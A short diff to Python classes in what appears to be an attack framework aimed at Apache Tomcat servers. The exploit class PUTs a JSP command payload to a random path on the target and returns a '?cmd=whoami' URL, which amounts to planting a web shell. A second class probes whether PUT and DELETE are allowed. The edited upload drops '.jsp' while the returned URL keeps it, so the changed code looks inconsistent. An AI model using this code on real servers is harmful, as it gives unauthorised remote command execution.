@@ -50,7 +50,7 @@ class TomcatPutExploitSubServiceClass(BaseSubServiceClass):
         verbose = kwargs.get("verbose", False)
 
         s = generate_random_string()
-        resp = requests.put(f"http://{host}/{s}.jsp", verify=False, data=cmd_jsp, headers={"Content-Type": "application/x-java-jsp"})
+        resp = requests.put(f"http://{host}/{s}", verify=False, data=cmd_jsp)
         print(resp.text)
 
         return f"http://{host}/{s}.jsp?cmd=whoami"
@@ -77,8 +77,10 @@ class TomcatPuttestSubServiceClass(BaseSubServiceClass):
         verbose = kwargs.get("verbose", False)
 
         s = generate_random_string()
-        requests.put(f"http://{host}/{s}", verify=False)
-        requests.delete(f"http://{host}/{s}", verify=False)
+        resp = requests.put(f"http://{host}/{s}", verify=False)
+        print(resp.text)
+        resp = requests.delete(f"http://{host}/{s}", verify=False)
+        print(resp.text)
         return host
 
 class TomcatBruteforceSubServiceClass(BaseSubServiceClass):
